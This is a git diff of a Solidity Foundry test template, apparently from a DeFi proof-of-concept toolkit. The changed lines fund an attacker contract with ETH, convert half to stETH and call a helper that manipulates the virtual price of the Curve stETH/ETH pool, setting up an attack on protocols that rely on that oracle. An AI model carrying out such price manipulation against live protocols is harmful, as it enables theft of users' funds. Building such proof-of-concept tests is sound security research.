@@ -13,10 +13,9 @@ contract PriceManipulationTemplate is PriceManipulation, Tokens {
         // In this example we are dealing ETH and stETH to an attacker to use for price manipulation
         // of the stETH / ETH Curve pool. This allows us to manipulate the virtual price of the asset
         // for an attack on a protocol which relies on the data from this oracle
-        deal(EthereumTokens.NATIVE_ASSET, address(this), 50000e18);
-        // Deal wstETH since forge deal cheatcode does not currently support stETH directly
-        deal(EthereumTokens.wstETH, address(this), 50000e18);
-        IWrapped(address(EthereumTokens.wstETH)).unwrap(50000e18);
+        deal(EthereumTokens.NATIVE_ASSET, address(this), 100000e18);
+        // Submit half our ETH to the stETH contract to get the stETH we need
+        IstETH(address(EthereumTokens.stETH)).submit{value: 50000e18}(address(0x0));
         console.log("Virtual price before:", pool.get_virtual_price());
         manipulatePrice(PriceManipulationProviders.CURVE, EthereumTokens.ETH, EthereumTokens.stETH, 50000e18, 50000e18);
         _completeAttack();
@@ -37,7 +36,6 @@ interface ICurvePool {
     function get_virtual_price() external view returns (uint256);
 }
 
-interface IWrapped {
-    function wrap(uint256) external;
-    function unwrap(uint256) external;
+interface IstETH {
+    function submit(address referrel) external payable;
 }
